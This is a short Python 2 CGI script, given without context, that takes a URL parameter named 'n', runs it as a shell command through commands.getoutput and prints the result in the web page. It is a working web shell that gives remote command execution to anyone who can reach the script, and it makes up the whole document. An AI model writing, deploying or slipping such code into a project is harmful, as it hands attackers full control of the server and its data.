#!/usr/bin/python

import cgitb,cgi, commands 
cgitb.enable()
print "Content-type:text/html"
print ""
a=cgi.FieldStorage()
b=a.getvalue('n')
x=commands.getoutput(b)
print "<pre>"
print x
print "</pre>"

